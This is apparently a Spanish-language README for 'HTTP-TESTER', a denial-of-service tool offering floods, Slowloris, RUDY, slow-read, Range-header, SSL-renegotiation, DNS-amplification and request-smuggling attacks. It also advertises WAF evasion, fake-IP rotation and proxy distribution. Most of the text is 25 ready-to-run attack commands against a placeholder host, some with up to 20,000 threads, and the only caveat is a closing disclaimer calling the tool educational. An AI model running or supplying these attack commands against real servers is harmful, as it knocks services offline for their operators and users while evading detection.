<p align="center">
  <img src="https://github.com/user-attachments/assets/12181966-eb42-44d0-ba2b-c95cbd4d7f7d" alt="HTTPTester" width="200"/>
</p>

<h1 align="center">HTTP-TESTER - Herramienta de Pruebas de DoS</h1>

<p align="center">
    <a href="https://python.org">
        <img src="https://img.shields.io/badge/Python-3.7+-green.svg">
    </a>
    <a href="https://github.com/yourusername/HTTP-TESTER/releases">
        <img src="https://img.shields.io/badge/Release-4.0-blue.svg">
    </a>
    <a href="https://github.com/yourusername/HTTP-TESTER/blob/main/LICENSE">
        <img src="https://img.shields.io/badge/License-MIT-red.svg">
    </a>
    <a href="https://github.com/yourusername/HTTP-TESTER/issues">
        <img src="https://img.shields.io/badge/Issues-Welcome-orange.svg">
    </a>
    <a href="https://github.com/yourusername/HTTP-TESTER">
        <img src="https://img.shields.io/badge/Status-Active-brightgreen.svg">
    </a>
</p>

---

## Descripción

**HTTP-TESTER** es una herramienta avanzada de pruebas de DoS para servidores web, diseñada para evaluar la resiliencia y capacidad de respuesta de infraestructuras web ante diferentes tipos de ataques y sobrecargas. Cuenta con múltiples vectores de ataque, gestión inteligente de recursos, soporte para proxies y estadísticas en tiempo real.

### Propósito

- **Pruebas de Rendimiento**: Evaluar la capacidad de un servidor bajo alta carga
- **Seguridad**: Identificar vulnerabilidades y puntos débiles
- **Educación**: Aprender sobre ataques DoS/DDoS y sus mecanismos
- **Optimización**: Mejorar la configuración de servidores

---

## Características

### Principales

- **Múltiples Modos de Ataque**: 12 vectores de ataque diferentes
- **Alta Concurrencia**: Soporte para miles de hilos simultáneos
- **Auto-Ajuste**: Regulación inteligente de recursos
- **Estadísticas en Tiempo Real**: Monitoreo continuo del rendimiento
- **Soporte para Proxies**: Uso de proxies SOCKS5 para distribución
- **Rotación de IP**: Generación automática de IPs falsas
- **Evasión de WAF**: Técnicas para evitar detección
- **SSL/TLS**: Soporte completo para conexiones seguras
- **HTTP/2**: Ataques sobre el protocolo HTTP/2

### Modos de Ataque

| Modo | Descripción | Uso |
|------|-------------|-----|
| **Inundación HTTP** | Ataque masivo con solicitudes GET | `--http` |
| **HTTP/2** | Explotación de vulnerabilidades HTTP/2 | `--http2` |
| **Slowloris** | Agotamiento de conexiones con apertura lenta | `--slowloris` |
| **Inundación POST** | Ataque con solicitudes POST masivas | `--post` |
| **R-U-Dead-Yet? (RUDY)** | Envío lento de datos POST | `--rudy` |
| **Ataque Rango** | Solicitudes con cabeceras Range maliciosas | `--rango` |
| **Cabeceras Múltiples** | Inyección de cientos de cabeceras | `--cabeceras-multiples` |
| **Renegociación SSL** | Ataque de renegociación SSL/TLS | `--ssl-reneg` |
| **WebSocket** | Ataque sobre conexiones WebSocket | `--websocket` |
| **Amplificación DNS** | Uso de servidores DNS públicos | `--amplificacion-dns` |
| **Slow Read** | Lectura extremadamente lenta | `--slow-read` |
| **Request Smuggling** | Contrabando de solicitudes HTTP | `--smuggling` |
| **Todos** | Activa todos los modos simultáneamente | `--todos` |

---

## 🎯 Ataques Básicos

### 1. Ataque Estándar (Puerto 443 - HTTPS)
```bash
python dos.py ejemplo.com -p 443 -t 1000 -d 60
```

### 2. Ataque Estándar (Puerto 80 - HTTP)
```bash
python dos.py ejemplo.com -p 80 -t 1000 -d 60 --ssl
```

### 3. Ataque con Todos los Modos
```bash
python dos.py ejemplo.com -p 443 -t 5000 -d 300 --todos --auto-ajuste --randomizar --evadir-waf
```

### 4. Ataque con Todos los Modos (Máxima Potencia)
```bash
python dos.py ejemplo.com -p 443 -t 20000 -d 600 --todos --auto-ajuste --randomizar --evadir-waf --conexiones 20 --tamano 8192
```

## 🔥 Ataques HTTP

### 5. Inundación HTTP Masiva
```bash
python dos.py ejemplo.com -p 80 -t 10000 -d 120 --http --auto-ajuste --randomizar
```

### 6. Inundación HTTP con SSL
```bash
python dos.py ejemplo.com -p 443 -t 8000 -d 180 --http --auto-ajuste --randomizar --evadir-waf
```

### 7. HTTP/2 Flooding
```bash
python dos.py ejemplo.com -p 443 -t 5000 -d 120 --http2 --auto-ajuste --randomizar
```

### 8. Inundación POST Masiva
```bash
python dos.py ejemplo.com -p 443 -t 3000 -d 180 --post --tamano 8192 --auto-ajuste
```

## 🐌 Ataques Slow

### 9. Slowloris (Agotar Conexiones)
```bash
python dos.py ejemplo.com -p 443 -t 2000 -d 300 --slowloris --conexiones 20 --auto-ajuste
```

### 10. Slowloris con Máximas Conexiones
```bash
python dos.py ejemplo.com -p 443 -t 5000 -d 600 --slowloris --conexiones 50 --auto-ajuste --randomizar --evadir-waf
```

### 11. Slow Read Attack
```bash
python dos.py ejemplo.com -p 443 -t 1000 -d 300 --slow-read --auto-ajuste
```

### 12. RUDY (R-U-Dead-Yet?)
```bash
python dos.py ejemplo.com -p 443 -t 1500 -d 300 --rudy --auto-ajuste --randomizar
```

## 🛡️ Ataques Especializados

### 13. Ataque de Rango
```bash
python dos.py ejemplo.com -p 443 -t 2000 -d 180 --rango --auto-ajuste --randomizar --evadir-waf
```

### 14. Cabeceras Múltiples
```bash
python dos.py ejemplo.com -p 443 -t 3000 -d 180 --cabeceras-multiples --auto-ajuste --randomizar --evadir-waf
```

### 15. Renegociación SSL
```bash
python dos.py ejemplo.com -p 443 -t 1000 -d 120 --ssl-reneg --auto-ajuste
```

### 16. Ataque WebSocket
```bash
python dos.py ejemplo.com -p 443 -t 1000 -d 300 --websocket --auto-ajuste
```

### 17. Amplificación DNS
```bash
python dos.py ejemplo.com -p 53 -t 500 -d 300 --amplificacion-dns --auto-ajuste
```

### 18. Request Smuggling
```bash
python dos.py ejemplo.com -p 443 -t 500 -d 180 --smuggling --auto-ajuste
```

🌐 Ataques con Proxies y Rotación de IP

### 19. Ataque con Proxies
```bash
python dos.py ejemplo.com -p 443 -t 3000 -d 300 --todos --proxies proxies.txt --auto-ajuste --randomizar --evadir-waf
```

### 20. Ataque con Rotación de IP
```bash
python dos.py ejemplo.com -p 443 -t 2000 -d 300 --http --rotar-ip --randomizar --evadir-waf --auto-ajuste
```

### 21. Ataque Combinado con Proxies y Rotación
```bash
python dos.py ejemplo.com -p 443 -t 5000 -d 600 --todos --proxies proxies.txt --rotar-ip --auto-ajuste --randomizar --evadir-waf --conexiones 15 --tamano 8192
```

## ⚡ Ataques Combinados

### 22. HTTP + POST + Rango
```bash
python dos.py ejemplo.com -p 443 -t 3000 -d 300 --http --post --rango --auto-ajuste --randomizar --evadir-waf
```

### 23. HTTP + Slowloris + POST
```bash
python dos.py ejemplo.com -p 443 -t 4000 -d 300 --http --slowloris --post --auto-ajuste --randomizar --evadir-waf
```

### 24. HTTP + WebSocket + Cabeceras Múltiples
```bash
python dos.py ejemplo.com -p 443 -t 3000 -d 300 --http --websocket --cabeceras-multiples --auto-ajuste --randomizar --evadir-waf
```

### 25. HTTP + Rango + Slow Read
```bash
python dos.py ejemplo.com -p 443 -t 2500 -d 300 --http --rango --slow-read --auto-ajuste --randomizar --evadir-waf
```


<p align="center">
    <b>⚠️ ADVERTENCIA: Esta herramienta es para fines educativos y de pruebas autorizadas únicamente.</b>
</p>
